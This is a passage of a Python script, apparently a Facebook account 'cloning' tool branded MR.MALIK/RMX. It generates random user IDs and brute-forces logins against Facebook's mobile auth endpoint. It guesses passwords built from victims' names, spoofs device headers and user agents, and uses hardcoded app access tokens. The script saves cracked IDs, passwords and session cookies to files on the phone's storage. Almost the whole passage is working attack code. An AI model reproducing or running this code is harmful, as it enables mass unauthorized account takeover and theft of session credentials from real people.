    elif _input in ['2','02']:old_tree()
    else:old()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[OLD CLONING M1]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def old_tow():
    user=[];clear()
    print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999");linex()
    limit=input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : ')
    clear()
    prefixes = ['100002', '100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD ')
    linex()
    meth=input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    with tred(max_workers=30) as pool:
        clear();print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m {limit}");print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for uid in user:
            if meth in ['1','01']:pool.submit(login_1,uid)                
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD CLONING M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def old_tree():
    user=[];clear()
    print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mEXAMPLE : 20000 | 30000 | 99999");linex()
    limit=input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mLIMIT : ')
    clear()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mMETHOD ')
    linex()
    meth=input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    with tred(max_workers=30) as pool:
        clear();print(f"\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL ACCOUNT IDS \033[1;97m:\x1b[38;5;46m {limit}");print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP');linex()
        for uid in user:
            if meth in ['1','01']:pool.submit(login_1,uid)                
    print('\033[1;37m');linex()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTHE PROCESS HAS COMPLETED')
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mTOTAL OK/CP : '+str(len(oks))+'/'+str(len(cps)));linex()
    input('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mPRESS ENTER TO BACK ')
    rmx_main()
#▬▭▬▭▬▭▬▭[FILE METHOD 1]▬▭▬▭▬▭▬▭#
def api1(ids,names,passlist):
        try:
                global loop,oks,cps,sim_id
                sys.stdout.write('\r\r\033[1;37m[M1] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['GLOBE','TM','TNT','SMART','Verizon','Sprint','Zong','null','Airtel','Gp','Roshan','Marshmallow','Telenor','Ufone','Jazz'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/296.0.0.17.137;FBBV/21810039;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/368298519;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-R910;FBSV/5;FBCA/armeabi-v7a:armeabi;]"
                        #ua = _____useragent_____()
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': adid,
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': ids,
'password': pas,
'method': 'auth.login',
'generate_analytics_claim':'1',
'community_id':'',
'cpl':'true',
'try_num':'1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'error_detail_type':'button_with_disabled',
'source':'account_recovery',
'generate_machine_id':'1',
'jazoest':'2980',
'meta_inf_fbmeta':'V2_UNTAGGED',
'encrypted_msisdn':'',
'currently_logged_in_userid':'0',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name':'autheticate',
'fb_api_caller_class':'Fb4aAuthHandler',
'api_key':'882a8490361da98702bf97a021ddc14d',
'access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
'sig':'4c854da0db9429f4913c2a1b221c1d30'}
                        headers={'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'POST': '/auth/login HTTP/2',
'Host': 'b-graph.facebook.com',
'Priority': 'u=3, i',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Sim-Hni': '64301',
'X-Fb-Net-Hni': '64301',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': ua,
'X-Fb-Connection-Quality': 'EXCELLENT',
'Authorization': 'OAuth null',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '6060',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '2126'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\x1b[38;5;46m[MR.MALIK] '+ids+' | '+pas+'\033[1;97m')
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/MR.MALIK/FILE/RMX-M1-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/MR.MALIK/FILE/RMX-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[MR.MALIK-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[MR.MALIK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR.MALIK-TOOL/FILE/MR.MALIK-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api1(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭[FILE METHOD 2]▬▭▬▭▬▭▬▭#
def api2(ids,names,passlist):
        try:
                global loop,oks,cps,sim_id
                sys.stdout.write('\r\r\033[1;37m[M2] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['GLOBE','TM','TNT','SMART','Verizon','Sprint','Zong','null','Airtel','Gp','Roshan','Marshmallow','Telenor','Ufone','Jazz'])
                        #ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636690;FBDM/{density=2.0,width=720,height=1184};FBLC/es_ES;FBRV/208541728;FBCR/TELCEL;FBMF/ZENEK;FBBD/ZENEK;FBPN/com.facebook.katana;FBDV/Libelula Z6001;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        ua = ethan_update_m2()
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\x1b[38;5;46m[MR.MALIK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerRMX = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RMXramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RMXramxan};{powerRMX}"
                                        open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M2-COOKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M2-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[MR.MALIK-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[MR.MALIK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RMX-TOOL/FILE/RMX-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api2(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭[FILE METHOD 3]▬▭▬▭▬▭▬▭#
def api3(ids,names,passlist):
        try:
                global loop,oks,cps,sim_id
                sys.stdout.write('\r\r\033[1;37m[M3] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        inform = random.choice(['X697''X663', 'X663B','PR652B','X267','X5010','X521','X5514D','X5515','X5515F','X559','X559C','X559F','X571','X572','X573','X573B','X601','X603','X604','X604B','X605','X606','X606B','X606C','X606D','X608','X609','X610','X610B','X612','X612B','X620','X620B','X622','X623','X623B','X624','X624B','X625','X625B','X625D','X626','X626B','X627V','X650','X650B','X650C','X650D','X652','X652A','X652B','X652C','X653','X653C','X655','X655C','X655D','X655F','X656','X657','X657B','X657C','X659B','X660','X660B','X660C','X680','X680B','X680C','X682B','X682C','X683','X687','X687B','X688B','X688C','X688C','X689','X689B','X689C','X690','X690B','X692','X693','X695','X695C'])
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['GLOBE','TM','TNT','SMART','Verizon','Sprint','Zong','null','Airtel','Gp','Roshan','Marshmallow','Telenor','Ufone','Jazz'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/250.0.0.11.114;FBBV/28055324;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/0;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P905V;FBSV/11;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': adid,
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': ids,
'password': pas,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_US',
'client_country_code': 'US',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
                        headers={'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': ua,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\x1b[38;5;46m[MR.MALIK-OK] '+ids+' | '+pas+'\033[1;97m')
                                        get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        coki = f"sb={compile_coki};{get_coki}"
                                        open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M3-COOKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M3-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        os.system('espeak -a 300 "HEY,  YOU,  GOT,  OK,  ID"')
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m[MR.MALIK-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m[MR.MALIK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/MR.MALIK-TOOL/FILE/RMX-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(5)
                api3(ids,names,passlist)
        except Exception as e:
                pass
#▬▭▬▭▬▭▬▭[FILE METHOD 4]▬▭▬▭▬▭▬▭#
def api4(ids,names,passlist):
        global loop,oks,cps,sim_id
        sys.stdout.write('\r\r\033[1;37m[M4] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.1,width=1080,height=1463};FBLC/en_US;FBRV/'+fbrv+';FBCR/NOS Portugal;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung Galaxy Note 10+;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'               
